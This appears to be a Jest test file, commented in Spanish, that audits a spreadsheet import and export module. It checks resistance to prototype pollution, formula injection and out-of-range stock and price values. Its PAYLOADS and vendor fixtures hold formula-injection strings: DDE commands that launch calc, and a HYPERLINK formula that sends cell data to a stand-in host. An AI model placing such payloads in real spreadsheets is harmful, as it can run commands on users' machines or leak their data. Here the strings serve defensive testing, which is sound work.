// Auditoria de seguridad RUN 20261012-2106 — REQ-PLA (AC-PLA-*, AC-SEC-2, AC-SEC-3).
// Prototype pollution en encabezados, formula injection en importacion y en la
// plantilla exportada, stock solo via movimientos (regla dura 4) y vendedor /
// proveedor resueltos por nombre. Solo dominio: no toca xlsx ni IndexedDB.
import {
  COLUMNAS_PLANTILLA, mapearEncabezados, planificarImportacion,
  validarFilaProducto, validarFilaCliente, resolverVendedor, resolverProveedor,
  armarPlantilla,
} from '../plantillas';
import { csvSafe } from '../validacion';
import { MAX_FILAS_IMPORT, MSG_EXCESO_FILAS } from '../importacion';

const NOW = new Date(2026, 9, 12);
const FORMULA = /^[=+\-@\t\r]/;
const LABELS_P = COLUMNAS_PLANTILLA.productos.map(c => c.label);
const LABELS_C = COLUMNAS_PLANTILLA.clientes.map(c => c.label);
const HOSTILES = ['__proto__', 'constructor', 'prototype', 'hasOwnProperty', 'toString', '__defineGetter__', 'valueOf'];

const sinContaminar = () => {
  expect(({}).polluted).toBeUndefined();
  expect(({}).isAdmin).toBeUndefined();
  expect(Object.prototype.hasOwnProperty.call(Object.prototype, 'polluted')).toBe(false);
  expect(typeof ({}).hasOwnProperty).toBe('function');
  expect(typeof ({}).toString).toBe('function');
};

afterEach(() => { delete Object.prototype.polluted; delete Object.prototype.isAdmin; });

describe('AC-SEC-2 S-PLA prototype pollution en encabezados', () => {
  test.each([['productos'], ['clientes']])('AC-SEC-2 %s: encabezados __proto__/constructor no se mapean ni contaminan', (entidad) => {
    const headers = [...HOSTILES, ...(entidad === 'productos' ? ['Descripción', 'Precio venta 1'] : ['Código cliente', 'Razón social', 'Domicilio de entrega'])];
    const m = mapearEncabezados(headers, entidad);
    // indices solo tiene claves de campos conocidos (salen del Map, no del texto del archivo)
    const permitidas = new Set(COLUMNAS_PLANTILLA[entidad].map(c => c.key).concat(['unidad']));
    for (const k of Object.keys(m.indices)) expect(permitidas.has(k)).toBe(true);
    expect(Object.getPrototypeOf(m.indices)).toBe(Object.prototype);
    sinContaminar();
  });

  test('AC-SEC-2 planificarImportacion con encabezados y celdas hostiles no contamina Object.prototype', () => {
    const rows = [
      ['__proto__', 'constructor', 'Código', 'Descripción', 'Precio venta 1'],
      ['{"polluted":1}', '{"isAdmin":true}', 'X1', 'Producto', '10'],
      ['polluted', 'isAdmin', 'X2', '__proto__', '20'],
    ];
    const plan = planificarImportacion(rows, 'productos', { existentes: [], proveedores: [] });
    expect(plan.ok).toBe(true);
    expect(plan.entradas.filter(e => e.accion === 'crear')).toHaveLength(2);
    // El nombre "__proto__" se guarda como texto comun, sin efectos.
    expect(plan.entradas[1].valor.producto.nombre).toBe('__proto__');
    sinContaminar();
  });

  test('AC-SEC-2 clientes: codigo "__proto__" / "constructor" son claves comunes (Map), no rompen la deteccion de duplicados', () => {
    const rows = [
      LABELS_C,
      ['__proto__', 'A', 'Calle 1'],
      ['constructor', 'B', 'Calle 2'],
      ['__PROTO__', 'C', 'Calle 3'],
    ];
    const plan = planificarImportacion(rows, 'clientes', { existentes: [], vendedores: [], now: NOW });
    expect(plan.entradas.map(e => e.accion)).toEqual(['crear', 'crear', 'rechazar']);
    sinContaminar();
  });
});

describe('AC-SEC-3 AC-PLA-6 formula injection en la importacion', () => {
  const PAYLOADS = ['=HYPERLINK("http://x.test/?d="&A1,"click")', '+cmd|\' /C calc\'!A0', '-2+3+cmd|\' /C calc\'!A0', '@SUM(1+1)*cmd|\' /C calc\'!A0', '\t=1+1', '\r=1+1'];

  test.each(PAYLOADS.map(p => [p]))('AC-SEC-3 producto: %j en codigo/descripcion/rubro/unidad queda neutralizado', (p) => {
    const r = validarFilaProducto({ codigo: p, nombre: p, categoria: p, unidad: p, precio: '10' }, { existentes: [], proveedores: [] });
    const { codigo, nombre, categoria, unidad } = r.valor.producto;
    for (const v of [codigo, nombre, categoria, unidad]) expect(FORMULA.test(String(v))).toBe(false);
  });

  test.each(PAYLOADS.map(p => [p]))('AC-SEC-3 cliente: %j en los campos de texto queda neutralizado; CUIT y celular solo digitos', (p) => {
    const valores = { codigo: p, nombre: p, direccion: p, ciudad: p, zona: p, pais: p, cobrador: p, tipoCliente: p, rubro: p, telefono: p, cuit: p };
    const r = validarFilaCliente(valores, { existentes: [], vendedores: [], now: NOW });
    for (const k of ['codigo', 'nombre', 'direccion', 'ciudad', 'zona', 'pais', 'cobrador', 'tipoCliente', 'rubro', 'telefono', 'cuit']) {
      expect(FORMULA.test(String(r.valor[k] ?? ''))).toBe(false);
    }
  });

  test('AC-SEC-3 la comision nunca sale del archivo aunque traiga una formula (AC-PLA-4)', () => {
    const rows = [[...LABELS_C, 'Comisión'], ['0001', 'Kiosco', 'Mitre 1', ...Array(LABELS_C.length - 3).fill(''), '=1+1']];
    const plan = planificarImportacion(rows, 'clientes', { existentes: [], vendedores: [], now: NOW });
    expect(plan.excluidas).toEqual(['Comisión']);
    // MOD (RUN 20261014-1449, AC-COMR-2): antes valor.comision era null; ahora la clave no existe.
    expect(plan.entradas[0].valor).not.toHaveProperty('comision');
  });
});

describe('AC-SEC-3 AC-PLA-6 formula injection en la plantilla exportada', () => {
  test('AC-SEC-3 nombres hostiles de vendedores/proveedores no salen como formula en ninguna celda', () => {
    const ctx = {
      vendedores: [{ id: 1, nombre: '=cmd|\' /C calc\'!A0' }, { id: 2, nombre: '@SUM(1)' }],
      proveedores: [{ id: 'p', codigo: 'X', descripcion: '+HYPERLINK("http://x.test")' }, { id: 'q', codigo: 'Y', descripcion: '-1+1' }],
    };
    for (const entidad of ['productos', 'clientes']) {
      const pl = armarPlantilla(entidad, ctx);
      for (const hoja of pl.hojas) for (const fila of hoja.filas) for (const c of fila) {
        if (typeof c === 'string') expect(FORMULA.test(c)).toBe(false);
      }
    }
  });

  test('AC-SEC-3 csvSafe respeta numeros puros y neutraliza el resto', () => {
    expect(csvSafe('-5')).toBe('-5');
    expect(csvSafe('1234,50')).toBe('1234,50');
    expect(csvSafe('-5+A1')).toBe("'-5+A1");
    expect(csvSafe('@x')).toBe("'@x");
  });
});

describe('AC-PROD-3 AC-STK-8 regla dura 4: la importacion no escribe stock', () => {
  test('AC-PROD-3 un producto existente con columna Stock no genera stock (stockIgnorado)', () => {
    const existentes = [{ id: 'p1', codigo: 'A1', nombre: 'Prod', precio: 10, unidad: 'unidad' }];
    const rows = [LABELS_P, ['A1', 'Prod', '', '', '', '', '', '', '', '10', '', '', '', '', '', '', '', '999']];
    const plan = planificarImportacion(rows, 'productos', { existentes, proveedores: [] });
    expect(plan.entradas[0].accion).toBe('actualizar');
    expect(plan.entradas[0].valor.stock).toBeNull();
    expect(plan.entradas[0].valor.producto).not.toHaveProperty('stock');
    expect(plan.resumen.stockIgnorado).toBe(1);
  });

  test.each([['-5'], ['1000001'], ['1e9'], ['NaN'], ['Infinity'], ['2,5'], ['=1+1']])('AC-STK-8 stock inicial %j se rechaza (entero 0..1.000.000)', (s) => {
    const r = validarFilaProducto({ codigo: 'N1', nombre: 'Nuevo', precio: '10', stock: s }, { existentes: [], proveedores: [] });
    expect(r.ok).toBe(false);
    expect(r.valor.stock).toBeNull();
  });

  test.each([['-1'], ['1e309'], ['Infinity'], ['NaN'], ['99999999999999']])('AC-SEC-2 precio %j fuera de rango se rechaza', (p) => {
    const r = validarFilaProducto({ codigo: 'N1', nombre: 'Nuevo', precio: p }, { existentes: [], proveedores: [] });
    expect(r.ok).toBe(false);
  });
});

describe('AC-PLA-3 AC-PLA-4 vendedor / proveedor por nombre', () => {
  test('AC-VEN-3 un vendedor dado de baja no se puede asignar por importacion', () => {
    const r = resolverVendedor('Carlos', [{ id: 1, nombre: 'Carlos', activo: false }]);
    expect(r.ok).toBe(false);
  });

  test('AC-PLA-3 un proveedor con descripcion repetida pide el codigo (no elige uno al azar)', () => {
    const r = resolverProveedor('Arcor', [{ id: 'a', codigo: 'A', descripcion: 'Arcor' }, { id: 'b', codigo: 'B', descripcion: 'ARCOR' }]);
    expect(r.ok).toBe(false);
  });

  // S-PLA-03 (Bajo): CORREGIDO en la iteracion 2. Dos "Carlos" activos =>
  // la fila se rechaza (no se elige uno al azar). Un homonimo dado de baja no cuenta.
  test('S-PLA-03 resolverVendedor rechaza un nombre que coincide con 2 vendedores activos', () => {
    const lista = [{ id: 1, nombre: 'Carlos' }, { id: 2, nombre: ' carlos ' }, { id: 3, nombre: 'Carlos', activo: false }];
    const r = resolverVendedor('CARLOS', lista);
    expect(r.ok).toBe(false);
    expect(r.error).toMatch(/Hay 2 vendedores activos llamados "CARLOS"/);
    expect(resolverVendedor('Carlos', [lista[0], lista[2]])).toEqual({ ok: true, nombre: 'Carlos' });
    const plan = planificarImportacion([LABELS_C, LABELS_C.map(l => ({ 'Código cliente': 'H1', 'Razón social': 'Homonimo', 'Domicilio de entrega': 'X 1', 'Vendedor': 'Carlos' }[l] || ''))], 'clientes', { vendedores: lista, now: NOW });
    expect(plan.entradas[0].accion).toBe('rechazar');
  });
  // S-PLA-01 (Medio): CORREGIDO en la iteracion 2 (topes en el dominio).
  test('S-PLA-01 planificarImportacion rechaza archivos con mas de MAX_FILAS_IMPORT filas', () => {
    const filas = [LABELS_P, ...Array.from({ length: MAX_FILAS_IMPORT + 1 }, (_, i) => LABELS_P.map(l => ({ 'Código': `C${i}`, 'Descripción': `P${i}`, 'Precio por unidad': '1' }[l] || '')))];
    const plan = planificarImportacion(filas, 'productos');
    expect(plan).toMatchObject({ ok: false, error: MSG_EXCESO_FILAS, entradas: [] });
    expect(planificarImportacion(filas.slice(0, MAX_FILAS_IMPORT + 1), 'productos').ok).toBe(true);
  });
});
